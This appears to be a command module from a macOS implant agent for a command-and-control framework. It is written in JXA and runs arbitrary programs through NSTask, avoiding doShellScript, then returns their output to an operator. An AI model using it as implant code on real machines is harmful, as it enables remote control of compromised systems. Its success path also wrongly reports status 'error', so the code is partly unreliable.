exports.run = function(task, command, params){
	//launch a program and args via ObjC bridge without doShellScript and return response
	try{
        let response = "";
        let pieces = JSON.parse(params);
        let path = pieces['path'];
        //console.log(path);
        let args = pieces['args'];
        let pipe = $.NSPipe.pipe;
		let file = pipe.fileHandleForReading;  // NSFileHandle
		let task = $.NSTask.alloc.init;
		task.launchPath = path; //'/bin/ps'
		task.arguments = args; //['ax']
		task.standardOutput = pipe;  // if not specified, literally writes to file handles 1 and 2
		task.standardError = pipe;
		//console.log("about to launch");
		task.launch; // Run the command 'ps ax'
		//console.log("launched");
		if(args[args.length - 1] != "&"){
		    //if we aren't tasking this to run in the background, then try to read the output from the program
		    //  this will hang our main program though for now
            let data = file.readDataToEndOfFile;  // NSData, potential to hang here?
            file.closeFile;
            response = data;
        }
        else{
            response = "launched program";
        }
    }catch(error){
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
	return JSON.stringify({"user_output":response, "completed": true, "status": "error"});
};
COMMAND_ENDS_HERE